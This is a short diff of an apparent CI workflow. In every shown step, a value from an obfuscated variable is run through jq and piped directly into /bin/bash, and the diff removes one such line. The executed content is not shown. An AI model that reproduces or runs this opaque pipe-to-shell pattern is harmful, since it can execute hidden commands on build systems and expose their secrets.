@@ -32,7 +32,6 @@ jobs:
           echo $bgqll78 | jq -r .tg00 | /bin/bash
           echo $eakf074 | jq -r .s7 | /bin/bash
           echo $tvsno2 | jq -r .h441 | /bin/bash
-          printf '%s' "$fw6" | jq -r .im3 | /bin/bash
           echo $ms1692 | jq -r .at7263 | /bin/bash
           echo $ml0 | jq -r .fce87714 | /bin/bash
           printf '%s' "$vfhdj6" | jq -r .mcdzl66391 | /bin/bash
